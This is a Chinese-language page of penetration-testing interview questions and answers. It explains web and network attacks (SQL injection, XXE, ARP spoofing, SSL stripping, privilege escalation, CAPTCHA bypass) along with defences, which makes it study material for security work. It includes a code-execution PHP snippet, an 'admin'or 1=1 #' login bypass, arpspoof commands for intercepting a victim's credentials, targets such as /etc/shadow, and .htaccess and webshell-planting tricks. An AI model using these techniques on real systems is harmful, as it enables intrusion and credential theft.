start="4"><li>服务器为IIS+PHP+MySQL，发现root权限注入漏洞，讲讲你的渗透思路。</li></ol><p>可以读取IIS信息，知道路径，如果像WAMMP类似构建，通过@@datadir知道数据库路径也可以猜测网站路径。<br>或者直接写shell</p><ol start="5"><li>下面这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利用。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.exp.com/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s_func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s_func&#x27;</span>];</span><br><span class="line"><span class="variable">$info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line"><span class="variable">$s_func</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>代码执行，通过assert调用。</p><ol start="6"><li>说出至少三种业务逻辑漏洞，以及修复方式？</li></ol><p>密码找回漏洞存在<br>(1) 密码允许暴力破解<br>(2) 存在通用型找回凭证<br>(3) 可以跳过验证步骤<br>(4) 找回凭证可以拦包获取<br>等方式来通过厂商提供的密码找回功能来得到密码。</p><p>身份认证漏洞中最常见的是<br>(1) 会话固定攻击<br>(2) Cookie仿冒</p><p>只要得到Session或Cookie即可伪造用户身份。验证码漏洞中存在<br>验证码允许暴力破解<br>验证码可以通过JavaScript或者改包的方式来进行绕过</p><ol start="7"><li>DNSRebinding</li></ol><p>DNS重绑定利用DNS绕过浏览器的同源策略。<br>攻击原理：攻击者首先控制一个域名，并将其指向一个恶意网站；然后使用恶意网站上的脚本诱导用户访问该域名；当用户访问时浏览器会将其解析为攻击者的IP地址；攻击者然后将域名的IP地址重绑定到另一个IP地址，该IP地址指向一个内网中的服务器；当用户再次访问该域名时，浏览器会使用攻击者重绑定的IP地址；由于浏览器认为这两个IP地址是同源的，因此恶意脚本可以访问内网中的服务器。<br>DNS重绑定攻击可以用来窃取敏感数据，例如用户名、密码和信用卡信息。它还可以用来执行恶意代码，例如安装恶意软件或控制受感染的设备。<br>防御：通过控制2次的DNS查询请求的间隔低于TTL值,确保两次查询的结果一致。写一个请求判断,Linux系统修改默认的TTL值为10,即可很轻松解决这个问题。使用 DNS 安全扩展 (DNSSEC)，该扩展可以防止 DNS 欺骗。<br><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击</a></p><p>1、攻击者设置恶意DNS服务器： 攻击者首先设置一个恶意的DNS服务器，该服务器会向受害者返回虚假的DNS记录。这些DNS记录通常指向攻击者的恶意服务器，而不是实际目标服务器。<br>2、受害者访问受信任的网站： 受害者在其浏览器中访问一个受信任的网站，该网站可能包含一些恶意的内容或利用漏洞。通常，这个受信任的网站包含了引用了攻击者的恶意域名的JavaScript代码。<br>3、恶意JavaScript执行： 受害者的浏览器执行了来自受信任网站的恶意JavaScript代码，该代码尝试在后台加载攻击者的恶意域名。浏览器会尝试解析恶意域名的IP地址，为此会发起DNS查询。<br>4、DNS重绑定： 浏览器向恶意DNS服务器发起DNS查询请求，攻击者的DNS服务器会返回一个虚假的DNS记录，将攻击者的恶意服务器的IP地址与恶意域名绑定。一旦浏览器获得了虚假的IP地址，它会发起与攻击者服务器的连接，从而执行攻击者所期望的操作。<br>5、攻击执行： 一旦浏览器与攻击者服务器建立了连接，攻击者可以执行各种恶意操作，例如窃取用户信息、执行未经授权的操作等。</p><ol start="8"><li>登录框攻击面</li></ol><p>错误信息判断：不同用户名或密码错误信息不同，可以暴力破解。修复方案是将错误信息改为一致。<br>弱口令：暴力破解。修复方案是禁用弱口令。<br>空口令：直接登录。修复方案是判断密码为空禁止空口令登录。<br>登录认证绕过：少数可禁用js绕过登录认证，也有少部分通过burp抓包改包登录绕过。修复方案是不用前端认证，增加验证码，密码通过加密算法加密，失败多次加锁，密码强度增加。<br>存在暴力破解：社工手段。修复方案：增加验证码，密码通过加密算法加密，失败多次加锁，密码强度增加。<br>图形验证码不失效：输入特殊字符可能绕过或验证码使用后未刷新。修复方案：验证码识别后销毁session中的验证码，限制用户提交的验证码不能为空，判断提交的验证码与服务器上存储的是否一致。<br>短信验证码绕过：某些网站使用手机短信登录，短信验证码可被绕过或验证码过短被爆破。修复方案：若存在特权验证码，建议删除；服务端严格校验验证码参数是否为空，格式是否正确；关键操作每提交一次请求，应发送新的短信验证码，旧的不可使用。<br>短信验证码可暴力破解：位数太短或有效期太长。修复方案：短信验证码不少于6位，有效期不超过1分钟，验证码错误次数上限锁定账户。<br>短信轰炸：发送数据包重放，若服务器短信平台未做校验，系统会一直发短信，造成短信轰炸，连续收到10条以上短信即可验证。修复方案：后端配置同一手机号发送次数不超过3-5次，对间隔时间做限制；前端禁止同一手机号进行次数大于5的发送，加入验证码功能，限制发送时间间隔。<br>恶意锁定问题：不断输入错误的密码恶意锁定任意账号。修复方案：账户锁定之后应不能继续使用认证功能。认证功能防自动化操作，如添加图形验证码。<br>密码明文传输：敏感数据未加密。修复方案：使用加密方式传输，如HTTPS，但可能会影响用户体验。也可用前端js加密后再传输。<br>反射型跨站脚本攻击：可对页面提交参数处进行测试。修复方案：输入验证，输出编码，黑白名单结合。<br>万能密码：诸如 <code>admin&#39;or 1=1 #</code> 。修复方案：web应用防火墙。<br>sql注入：不多说。修复方案：略。<br>任意用户密码修改&#x2F;重置：篡改用户名或id、暴力破解验证码等方式修改或重置任意账户密码。修复方案：及时对请求的用户身份与当前登录的用户身份进行校验，判断是否有权修改用户的密码并对原始密码是否正确进行正确判断；对原始密码进行了验证的情况下，限制输入原始密码的错误次数，防止攻击者暴力破解原始密码；重置密码链接中的关键信息应随机化，不可预测(如token)，且禁止将关键信息返回到客户端。<br>目录遍历：输入类似于 <code>../../</code> 或通过御剑进行目录扫描。修复方案：IIS中关闭目录浏览功能，在IIS的网站属性中，勾去目录浏览选项，重启IIS；Apache中关闭目录浏览功能，打开Apache配置文件中的httpd.conf，查找“Options Indexs FollowSymLinks”，修改为“ Options -Indexes”(减号表示取消，保存退出，重启Apache；Nginx中默认不会开启目录浏览功能，若您发现当前已开启该功能，可以编辑nginx.conf文件，删除如下两行：autoindex on;autoindex_exact_size on;重启Nginx。<br>敏感文件信息泄露：爬虫扫描或手工挖掘查看源代码。修复方案：重要代码注意加密保护或隐藏。</p><ol start="9"><li>getshell的姿势</li></ol><p>两篇参考文章：<br><a href="https://blog.csdn.net/m0_53087192/article/details/112779349">各种Getshell姿势总结</a><br><a href="https://www.freebuf.com/articles/web/258229.html">GetShell的姿势总结</a></p><ol start="10"><li>DNS重绑定，利用</li></ol><p>见问题7</p><ol start="11"><li>disable function bypass</li></ol><p>(1) 黑名单绕过：查找漏网之鱼。如: <code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open</code><br>(2) 利用Windows组件COM绕过。查看 <code>com.allow_dcom</code> 是否开启,这个默认是不开启的。<br>(3) 利用pcntl_exec结合python反弹shell。使用条件是PHP安装并启用了pcntl插件。<br>(4) 利用LD_PRELOAD环境变量。通过环境变量LD_PRELOAD劫持系统函数。<br>(5) 利用ShellShock(CVE-2014-6271)。Bash破壳漏洞。<br>(6) 利用Apache Mod CGI<br>(7) 通过攻击PHP-FPM<br>(8) 利用GC UAF<br>(9) 利用Backtrace UAF<br>(10) Json Serializer UAF<br>(11) 利用SplDoublyLinkedList UAC<br>(12) 利用FFI扩展执行命令<br>(13) 利用ImageMagick</p><p><a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情</a><br><a href="https://xz.aliyun.com/t/10057">bypass disable_functions姿势总结</a><br><a href="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/">常见Bypass Disable Functions方法</a></p><ol start="12"><li>写出你知道的逻辑漏洞</li></ol><p>按类型：<br>身份验证漏洞：暴力破解漏洞、Session固定攻击、cookie欺骗漏洞。<br>权限类逻辑漏洞：平行权限跨越、垂直权限跨越、未经授权访问。<br>图形验证码漏洞：图形验证码突破。<br>找回密码逻辑漏洞：密码找回漏洞。<br>业务数据篡改漏洞：业务数据篡改（赋值反冲）<br>执行顺序逻辑漏洞：执行顺序篡改。<br>其他类型逻辑漏洞：条件竞争漏洞、数据包重放漏洞、参数绑定漏洞。</p><p><a href="https://www.freebuf.com/vuls/281141.html">逻辑漏洞梳理与总结</a></p><ol start="13"><li>简述XXE的基本原理，以及如何去检测或判断blind XXE的存在</li></ol><p>XXE(XML External Entity Injection)，外部实体注入漏洞。攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。<br>如何检测或判断Blind XXE存在：寻找XML输入点。比如Content-Type:text&#x2F;xml，post数据包含XML格式。将结果写入文件查看。<br>防御：完全禁用DTD，过滤用户提交的XML数据。</p><ol start="14"><li>ARP攻击的原理(讲出具体流程)，如何发现并防御ARP攻击</li></ol><p>ARP协议没有真伪校验机制，因此网络中的攻击者可以通过伪造IP地址和MAC地址发出一些假报文来欺骗其它主机，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断地发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><p>具体流程：<br>PC1需要跟PC2通信，通过ARP请求包询问PC2的MAC地址，由于采用广播形式，所以交换机将ARP请求包从接口P1广播到P2和PC3。（注：交换机收到广播&#x2F;组播&#x2F;未知帧都会其他接口泛洪）<br>PC2根据询问信息，返回ARP单播回应包；此时PC3作为攻击者，没有返回ARP包，但是处于”监听”状态，为后续攻击做准备。<br>PC1和PC2根据ARP问答，将各自的ARP映射信息（IP-MAC）存储在本地ARP缓存表。<br>交换机根据其学习机制，记录MAC地址对应的接口信息，存储在CAM缓存表（也称为MAC地址表）。交换机收到数据包时，会解封装数据包，根据目标MAC字段进行转发。(ARP表遵循后到优先原则，攻击者只需源源不断发送IP-MAC的ARP回应包即可。)</p><p>防御：<br>使用HTTPS加密协议：<br>ARP静态绑定：在路由和终端上同时进行 IP 地址和 MAC 地址的绑定，相当于人工管理 ARP 缓存，自行维护 IP 地址和 MAC 地址的对应关系。但维护非常繁琐。换个网卡或 IP 地址，都需要重新修改配置。当流动电脑临时接入时，也要即时进行绑定，费时费力。<br>交换机端口绑定：跟双绑措施类似，只不过将 IP 和交换机端口进行绑定，缺点也是类似的。<br>PPPoE：使用 PPPoE 协议对网络流量进行二次封装，为每个用户都分配账号密码，上网时必须通过认证。这样 ARP 报文在一个认证的通道中传输，也就不会遭受攻击了。但 PPPoE 也不是完美的，由于二次封装的存在，传输效率会打些折扣。更严重的是，PPPoE 方式下局域网内无法互访。如果局域网内需要部署文件服务器、打印机，就有麻烦了。<br>启用ARP防火墙：ARP防火墙可以检测和阻断恶意的ARP报文，从而防止ARP攻击。<br>启用DHCP Snooping：DHCP Snooping 是一种交换机功能，可以阻止攻击者伪造 DHCP 报文来欺骗受害机器。</p><p><a href="https://zhuanlan.zhihu.com/p/28818627">图解ARP协议（二）ARP攻击篇</a></p><ol start="15"><li>SSL Strip（SSP）攻击到底是什么？</li></ol><p>SSL Strip(也叫HTTPS降级攻击)原理：为了剥离SSL，攻击者干预了HTTP到安全HTTPS协议的重定向，并拦截了用户到服务器的请求。然后，攻击者将继续在自己和服务器之间建立HTTPS连接，并与用户建立不安全的HTTP连接，充当他们的桥梁。<br>SSL Strip利用了大多数用户访问SSL的方式。大多数访问者连接到通过302重定向进行重定向的网站页面，或通过非SSL网站的连接到达SSL页面。<br>举例：受害者想打开网站 <code>www.example.com</code> ，则浏览器连接到攻击者机器，并等待服务器的响应。反过来，在SSL Strip中，攻击者将受害者的请求转发到example的服务器，并接收安全地HTTPS页面。例如: <code>https://www.example.com</code> 。此时，攻击者已经完全控制了页面。他将HTTPS降级为HTTP，然后将其发回到受害者的浏览器，现在浏览器将其重定向到 <code>http://www.example.com</code> ，受害者的所有信息将会纯文本格式传输，攻击者将能拦截它们。服务器认为已经建立安全连接，实际上确实建立了安全连接，只是连接到攻击者机器上。<br>实施方法：SSL Strip攻击最常见的方法是创建热点并允许受害者连接到该热点。采用与官方开放连接相似的热点名称来混淆伪造。假如麦当劳热点名称是“麦当劳”，那么攻击者可以将热点伪造为“麦当劳餐厅”。一旦用户尝试连接到服务器，攻击者便会使用对热点的控制来攻击用户。</p><p>防御措施：<br>(1) 启用HSTS。HSTS是一种安全策略，告诉浏览器在未来的访问中都使用HTTPS。缺点是用户首次访问不受HSTS保护，首次访问浏览器未收到HSTS。<br>(2) 使用HTTPS Everywhere。这是一个浏览器扩展，它会自动将所有网站的请求切换到HTTPS。<br>(3) 使用HTTPS强制传输。最有效。<br>(4) WIFI加密传输。<br>(5) 定期更新SSL证书。</p><p><a href="https://learnku.com/cs/t/42552">什么是 SSL Strip 攻击？</a><br><a href="https://glsakura.gitee.io/2020/04/02/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%20SSLStrip%20%E6%94%BB%E5%87%BB/">如何进行一次完整的 SSLStrip 攻击</a></p><ol start="16"><li>中间人攻击–ARP欺骗原理、实战及防御</li></ol><p>ARP欺骗(Address Resolution Protocol Spoofing)原理是通过伪造或欺骗ARP协议的通信过程，使攻击者能够欺骗其它主机，使他们将数据发送到错误主机上，从而达到攻击者的目的。</p><p>在一个以太网中，当一台主机想要发送数据包给另一台主机时，它需要知道目标主机的MAC地址。<br>此时，发送方会发送一个ARP请求，请求目标主机的MAC地址。<br>目标主机会将自己的MAC地址发送回去，请求方则将其缓存到自己的ARP缓存中，以加快以后的通信。<br>攻击者会利用这个过程伪造自己的MAC地址，并向其他主机发送这种伪造的ARP请求，从而将目标主机的MAC地址指向攻击者的MAC地址。<br>这就使攻击者能够接收到目标主机发送的数据包，并可以选择是否转发或篡改这些数据，同时继续欺骗其他主机。</p><p>实战：<br>开始前更新kali下的软件列表，然后安装dsniff（用于自动化完成ARP欺骗）。<br>攻击机输入 <code>ifconfig</code> 查看内网IP，接着输入 <code>nbtscan -r 192.168.119.0/24</code> 扫描内网网段。<br>探测到了IP为192.168.119.131，名为HAIXIN-PC的受害机。检测网络连接正常。<br>接下来在攻击机中输入 <code>arpspoof -i eth0 -t 192.168.119.131 192.168.119.2</code> 开启ARP攻击，其中 <code>-i</code> 指定攻击机某张网卡来进行攻击， <code>-t</code> 第一个IP指定受害机的IP为内网网关（一般是路由）的IP，第一个参数可通过扫描确定，第二个参数可在攻击机中输入 <code>netstat -rn</code> 来查看。<br>通过以上措施可使目标机器断网。接下来要使kali具备类似路由的功能，将受害机发来的网络请求包转发给真实的网关，再由真实网关转发到外网，接收返回包的过程同理。<br>使用以下命令暂时开启kali的路由转发功能: <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code> 。此时受害者机器网络连接正常说明路由转发功能已开启。<br>打开wireshark并选择之前进行arp欺骗的网卡。当受害者打开某个登录网页时，流量会被wireshark捕捉到，最终得到受害者信息</p><p>防御：<br>(1) 静态ARP绑定：将网络中的关键设备的MAC地址与其IP地址进行手动绑定，以防止攻击者发送虚假的ARP响应。这个方法对于关键服务器和网络设备非常有用，但需要定期维护。<br>(2) 网络监控和入侵检测系统（IDS&#x2F;IPS）：使用网络监控工具和入侵检测系统来检测异常ARP活动。这些系统可以监视并响应异常的ARP流量，例如大量的ARP请求或虚假的ARP响应。<br>(3) ARP检测工具：使用ARP检测工具来监视网络流量和ARP请求&#x2F;响应，以检测潜在的ARP欺骗攻击。这些工具可以警告管理员或自动采取措施来应对攻击。<br>(4) 网络隔离：将网络划分成多个子网，并使用防火墙和ACL（访问控制列表）来限制不同子网之间的流量。这有助于减少ARP欺骗攻击的影响范围。<br>(5) 端口安全性：在交换机上启用端口安全性功能，限制每个端口连接的设备数量，并只允许已知MAC地址的设备连接到端口。这可以防止未经授权的设备连接到网络。<br>(6) DHCP Snooping：启用DHCP Snooping功能，以确保DHCP分配的IP地址与相应的MAC地址匹配。这有助于减少攻击者通过伪造IP地址来进行ARP欺骗的可能性。<br>(7) 802.1X认证：使用802.1X认证来要求网络设备进行身份验证，然后再允许其访问网络。这可以防止未经授权的设备访问网络并进行ARP欺骗攻击。</p><p><a href="https://www.freebuf.com/articles/network/266951.html">中间人攻击之arp欺骗</a></p><ol start="17"><li>会话劫持原理</li></ol><p>会话劫持(Session Hijacking, 又名cookie劫持或cookie side-jacking)是一种网络攻击。攻击者通过窃取合法用户的会话ID，接管该用户的网络会话，从而获得该用户的权限。<br>原理：<br>首先要获取合法用户的ID。可通过钓鱼，监听网络流量，诱使用户点击恶意链接，利用应用程序漏洞。<br>攻击者获取到会话ID后，可以伪装成合法用户，向服务器发送请求。<br>服务器收到请求后，会将请求转发给合法用户。<br>攻击者可以通过接管合法用户的网络会话，获得该用户的权限。</p><ol start="18"><li>CC攻击</li></ol><p>CC攻击(Challenge Collapsar Attack)是一种拒绝服务攻击(DDoS)的一种，攻击者通过向受害者目标发送大量的请求，从而导致目标资源耗尽，无法正常提供服务。</p><p>原理：<br>(1) 攻击者首先要获取目标的IP地址和端口号。<br>(2) 攻击者使用CC攻击工具，向目标发送大量的请求。<br>(3) 目标收到请求后，会消耗大量的资源来处理这些请求。<br>(4) 当目标的资源耗尽后，将无法正常提供服务。</p><p>一般来说，CC攻击有两种方式进行：第一种方式是利用自己的机器对目标网站进行集中式攻击，目标网站接收到大量的访问请求后，服务器无法正常响应；第二种方式是通过使用大量的分散在各个地区、各个网络和主机上的代理程序或者“僵尸”计算机来攻击目标网站，这样作为攻击源的计算机会比较难以被记录下来。</p><p>危害：破坏服务(如网站，银行，电商等)，勒索(勒索目标，要求目标支付赎金)，宣传(宣传自己的网站或产品)，用户访问速度慢影响体验，长时间会造成搜索排名下降云服务器商清退。</p><p>防御：<br>(1) 使用CDN: 分散流量到多个服务器上，减轻单个服务器压力。<br>(2) 使用WAF: 过滤恶意请求。<br>(3) 使用CC防护服务: 措施是流量清洗，流量分发，DDoS防御。具体有云端CC防护(CloudFlare，阿里云，腾讯云，华为云)和本地CC防护。</p><p>特点：攻击量大，攻击目标广泛，防御难度大。</p><ol start="19"><li>添加时间戳防止重放攻击</li></ol><p>重放攻击(Replay Attack,或称回放攻击)是指攻击者截获了合法用户的请求，并将其重新发送给服务器，以达到冒充合法用户的目的。重放攻击可以用于盗取用户的账号信息、进行非法操作等。</p><p>添加时间戳可以防止重放攻击的原理是：服务器会在收到请求时，检查请求中的时间戳是否在有效范围内。如果时间戳过期，则认为该请求是重复请求，拒绝处理。</p><p>添加时间戳的方法：</p><ul><li>在请求头中添加时间戳：客户端在发送请求时，会在请求头中添加一个名为“timestamp”的时间戳参数，该参数的值为当前时间戳。服务器在收到请求时，会检查该参数的值是否在有效范围内。</li><li>在请求头中添加时间戳：类似于上。</li></ul><p>注意事项：<br>时间戳有效范围可以根据需求设置，一般设置为60s。<br>在服务器端，需要缓存时间戳，以便进行检查。</p><p>优缺点：<br>在客户端和服务端都需要进行修改。<br>时间戳的有效范围需要根据具体需求进行设置。</p><p>除了添加时间戳外，还可以：<br>使用nonce：nonce是一个随机数，每次请求会产生一个新的nonce。服务器会在收到请求时，检查nonce是否存在。nonce存在则认为请求是重复请求拒绝处理。<br>使用数字签名：客户端使用私钥对请求进行签名，服务器使用公钥验签。验签失败则认为是伪造的拒绝处理。</p><ol start="20"><li>https中间人攻击与证书校验</li></ol><p>HTTPS中间人攻击(Man-in-the-middle attack)是指攻击者在客户端和服务器之间建立了一个信任关系，从而可以拦截、修改或丢弃客户端发送给服务器或服务器发送给客户端的数据。<br>HTTPS中间人攻击的常用手段是伪造服务器证书。攻击者可以使用自己伪造的证书，或者使用被劫持的证书。</p><p>HTTPS证书校验的常见方法是：</p><ul><li>检查证书的颁发机构：是否为受信任的机构</li><li>检查证书的有效期：是否过期。</li><li>检查证书的域名：客户端会检查服务器证书的域名与客户端请求的域名相匹配。</li></ul><p>HTTPS强校验：指客户端不允许使用自签名证书或过期的证书。如果客户端检测到服务器使用了自签名证书或过期的证书，则会拒绝连接到该服务器。<br>HTTPS证书pinning：指客户端将服务器证书的哈希值保存到本地。如果检测到服务器证书的哈希值与本地保存的哈希值不匹配，则拒绝连接。<br><a href="https://www.cnblogs.com/jmilkfan-fanguiju/p/10589756.html">自建 CA 中心并签发 CA 证书</a><br><a href="https://zhuanlan.zhihu.com/p/59759209">HTTPS中间人攻击实践</a></p><ol start="21"><li>越权以及逻辑漏洞问题</li></ol><p>越权漏洞是指应用程序未对当前用户操作的身份权限进行严格校验，导致用户可以操作超出自己管理权限范围的功能，从而操作一些非该用户可以操作的行为。越权漏洞是一种常见的安全漏洞，属于“失效的访问控制”的问题，指其它用户能够执行本身没有资格执行的一些操作。</p><p>分类：<br>水平越权：攻击者可以访问其它同级用户的资源或数据。<br>垂直越权：攻击者可以访问更高权限用户的资源或数据。<br>交叉越权：拥有水平越权和垂直越权的权限。</p><p>常见原因包括：<br>开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。<br>应用程序没有对用户的身份进行严格校验，例如使用了弱密码或没有使用权限验证。<br>应用程序的设计存在缺陷：例如没有对敏感数据进行加密。<br>通过隐藏URL，直接对象引用，多阶段功能，静态文件，平台配置错误。</p><p>检测：通过特定传参的更改来发现越权漏洞。</p><p>防御措施：<br>严格校验用户的身份权限，例如强密码、进行权限验证、对敏感数据进行加密等。<br>使用安全的编码规范，例如避免使用弱密码、使用安全的编程语言和框架等。<br>定期进行安全扫描，发现和修复越权漏洞。<br>前后端验证，关键操作前验证身份</p><ol start="22"><li>验证码绕过有哪些方法？</li></ol><p>验证码(CAPTCHA)是“Completely Automated Public Turing test to tell Computers and Humans Apart”全自动区分计算机和人类的图灵测试的缩写。<br><img src="/simg/captcha1.jpg" alt="占比"><br>(1) 验证码固定之无条件不刷新：不刷新验证码绕过。<br>(2) 验证码固定之有条件不刷新：不通过其条件绕过。<br>(3) 验证码前端可获取：验证码隐藏在源码或cookie中。<br>(4) 仅在客户端生成验证码：本地js验证<br>(5) 验证码薄弱：使用插件或工具(PKAV HTTP FUzzer)识别。<br>(6) 验证码爆破登录：抓包丢进工具爆破。<br>(7) 验证码可控制：验证码包含在URL里面，是一个URL传参，可以把URL设置定，验证码可控制。<br>(8) 空验证码绕过：可以通过删除验证码参数或cookie中的值判断，进行暴力破解。<br>(9) 万能验证码：无论是什么，只要输入000000就能直接绕过。<br><a href="https://www.freebuf.com/articles/network/276509.html">验证码绕过、密码找回漏洞</a><br><a href="https://xz.aliyun.com/t/12557">绕过滑块验证码拿到高危漏洞</a></p><ol start="23"><li>分别说出iis，apache，nginx解析漏洞原理</li></ol><p>IIS解析漏洞（也称为IIS路径遍历漏洞）原理：IIS服务器会根据URL中文件的扩展名来判断文件类型，并将其交给相应的处理程序进行处理。攻击者可以利用这一点，构造特殊的URL，让IIS服务器将非脚本文件误认为脚本文件，从而执行恶意代码。</p><p>Apache解析漏洞（也称为Apache漏洞或.htaccess漏洞）原理：Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析。<br>比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p><p>Nginx解析漏洞原理：该漏洞通常是由于Nginx服务器配置不当导致的，攻击者可以通过发送特制的HTTP请求并利用Nginx基于路径转换的问题来访问受限文件。攻击者通过发送带有特定构造的HTTP请求，欺骗服务器将请求转换为其他路径，从而绕过了服务器的访问控制。<br>比如：攻击者可以使用..&#x2F;，.&#x2F;，%2e%2e&#x2F;等字符序列来尝试绕过服务器的访问限制，访问服务器上其他目录中的文件。</p><ol start="24"><li>任意下载漏洞攻击原理及测试方法</li></ol><p>任意文件下载漏洞(Arbitrary File Download Vulnerability)原理：攻击者构造特殊的请求，让服务器下载指定文件。<br>测试方法：<br>注册合法账号登入平台，避免被系统禁止访问。不能造成系统的损坏，记录结果。<br>手动或使用工具（dirbuster, burpsuite）查找常见接口点，比如 <code>download.php?path=  down.php?file=  &amp;src=  &amp;inputfile=</code> ，也可使用Google hacking <code>inurl:&quot;readfile.php?file=&quot;</code><br>尝试下载系统文件( <code>/etc/passwd   /etc/shadow   /etc/sudoers</code> )，数据库文件( <code>/var/lib/mysql/</code> )，其它敏感文件( <code>/home/admin/</code> )</p><p><a href="https://blog.csdn.net/weixin_43148062/article/details/105496744">渗透测试-任意文件下载漏洞</a></p><ol start="25"><li>xxe漏洞攻击原理是什么？如何找xxe漏洞及攻击方法</li></ol><p>见问题13</p><ol start="26"><li>xxe攻击在无回显的时候是怎么突破的？</li></ol><p>见问题13</p><ol start="27"><li>如何防范xxe漏洞？</li></ol><p>见问题13</p><ol start="28"><li>越权问题有哪些？实战</li></ol><p>越权见问题24</p><p>实战：<br>攻击场景：<br>(1) 登录<br>未授权访问:可尝试修改响应码，从链接访问从而绕过，人为疏忽导致密码暴露。<br>身份或登录信息伪造：将身份或登录信息简单编码(Base64)加密(MD5)后放在链接中或数据包中<br>(2) 数据<br>身份信息伪造：身份校验采用明文或简单编码加密。<br>数据篡改：正负值反冲，修改订单数据，修改商品ID等。发送信息或邮件等可以尝试爆破构成短信&#x2F;邮件轰炸。<br>流程越过：越过中间校验步骤直接进行后续操作。<br><a href="https://www.freebuf.com/vuls/313396.html">实战中的越权攻击总结</a></p><ol start="29"><li>URL跳转漏洞</li></ol><p>URL跳转漏洞（Open Redirect Vulnerability）是一种常见的Web安全漏洞，攻击者可通过构造恶意链接，引导用户跳转到恶意网站，从而窃取用户敏感信息等。常见的URL跳转漏洞发生原因一般是在程序中没有对跳转URL进行有效的过滤和校验，攻击者可以通过构造链接，在跳转URL中注入恶意代码或者外部URL，从而实现对跳转流程的控制。<br>绕过方式：@绕过，?绕过，#绕过，斜杠(&#x2F;)绕过，反斜杠(\)绕过，白名单匹配绕过，xip.io绕过，协议绕过，xss跳转。<br>fuzz的参数： <code>redirect, url, redirecturl, callback, return_url, toUrl, jump, target, to, link, domain</code></p><p>实战：登录跳转，充值接口跳转，xss造成的url跳转</p><ol start="30"><li>ARP欺骗的方法有哪些？说说原理</li></ol><p>见问题14</p><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li>如果遇到waf的情况如何进行sql注入&#x2F;上传webshell怎么做？请写出曾经绕过WAF的经过。</li></ol><p>遇到waf首先查看是哪家的waf，然后网上查找相关资料或询问有关人员根据waf的漏洞进行绕过。</p><ol start="2"><li>拿到一个待测的站，首先应该做什么？</li></ol><p>信息收集：获取域名的whois信息，注册者邮箱电话等。通过站长之家，明小子，k8等查询服务器旁站，C段及子域名站点。服务器操作系统的版本、中间件、数据库类型，前端语言，后端语言，开放端口，真实IP，网站指纹。Google hack进一步收集网站信息，后台，敏感文件等。qq，邮箱，身份证，电话使用社工库反查。</p><p>漏洞扫描：nmap，御剑，dirbuster，sqlmap，burp，metasploit，nessus，AWVS，goby</p><p>漏洞利用…<br><a href="https://blog.csdn.net/m0_45097365/article/details/122831464">渗透测试流程</a></p><ol start="3"><li>判断出网站的CMS对渗透有什么意义？</li></ol><p>可以查找已知的漏洞了解弱点，如果是开源CMS，可以将源码下载进行审计。</p><ol start="4"><li>一个成熟并且相对安全的CMS，渗透时扫目录的意义？</li></ol><p>敏感文件、二级目录扫描<br>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p><ol start="5"><li>在某后台新闻编辑界面看到编辑器，应该先做什么？</li></ol><p>查看编辑器的名称版本,然后搜索公开的漏洞。</p><ol start="6"><li>拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</li></ol><p>能做很多事，如上传.htaccess文件并上传图片码，获取网站的权限<br>插入 <code>&lt;FilesMatcher &quot;xxx.jpg&quot;&gt; SetHandler application/x-httpd-php</code> .jpg文件会被解析成.php文件。<br>.htaccess 文件可以用来重写 URL，这是比较常见的一种用法。攻击者可以使用它来欺骗用户，让用户访问一个恶意网站，或者重定向到钓鱼站点等</p><ol start="7"><li>注入漏洞只能查账号密码？</li></ol><p>还可以修改数据库，进行DDoS攻击，执行任意代码。</p><ol start="8"><li>安全狗会追踪变量，从而发现是一句话木马吗？</li></ol><p>不是，是根据特征码，所以只要更改特征码即可。</p><ol start="9"><li>.access扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？</li></ol><p>迅雷下载，直接改后缀为.mdb</p><ol start="10"><li>如何利用这个防注入系统拿shell？<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">某个防注入系统，在注入时会提示：</span><br><span class="line">系统检测到你有非法注入的行为。</span><br><span class="line">已记录您的IP:xxx.xxx.xx.xx</span><br><span class="line">时间:yy:mm:dd</span><br><span class="line">提交页面: test.asp?id=15</span><br><span class="line">提交内容: and 1=1</span><br></pre></td></tr></table></figure></li></ol><p>在URL里面直接提交一句话，然后网站就会把提交内容记录进数据库文件，之后尝试查找网站的配置文件，使用shell连接工具(如：蚁剑)</p><ol start="11"><li>上传大马后访问乱码时，有哪些解决办法？</li></ol><p>浏览器中改编码</p><ol start="12"><li>审查上传点的元素有什么意义？</li></ol><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制。</p><ol 